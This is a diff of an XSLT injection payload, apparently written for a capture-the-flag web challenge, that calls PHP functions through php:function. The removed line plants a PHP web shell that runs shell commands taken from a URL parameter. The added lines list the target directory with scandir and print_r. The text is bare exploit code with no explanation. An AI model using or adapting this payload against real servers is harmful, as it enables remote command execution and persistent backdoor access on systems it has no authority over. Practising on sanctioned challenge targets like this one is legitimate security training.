@@ -2,7 +2,8 @@
 <xsl:template match="/">
 
 
-    <xsl:value-of select="php:function('file_put_contents','/challenge/web-serveur/ch50/shell.php','<?php echo shell_exec($_GET["e"]); ?>')"/>
+    <xsl:variable name="path" select="php:function('scandir','/challenge/web-serveur/ch50/')"/>
+<xsl:value-of select="php:function('print_r',$path)" />
     
     </xsl:template>
 </xsl:stylesheet>
